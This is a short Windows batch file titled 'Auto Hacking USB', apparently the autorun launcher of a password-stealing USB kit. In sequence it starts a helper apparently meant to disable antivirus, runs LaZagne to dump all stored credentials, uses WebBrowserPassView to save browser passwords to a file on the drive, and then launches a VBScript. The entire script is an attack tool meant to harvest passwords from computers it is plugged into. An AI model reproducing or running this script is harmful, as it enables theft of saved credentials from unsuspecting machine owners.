@echo off
title Auto Hacking USB - xyse
:Start
start .\App\avrem.bat
ping localhost -n 2 >nul
start laZagne.exe all -w
start .\App\WebPass\WebBrowserPassView.exe /stext .\Files\Passwords.txt
start input.vbs
exit

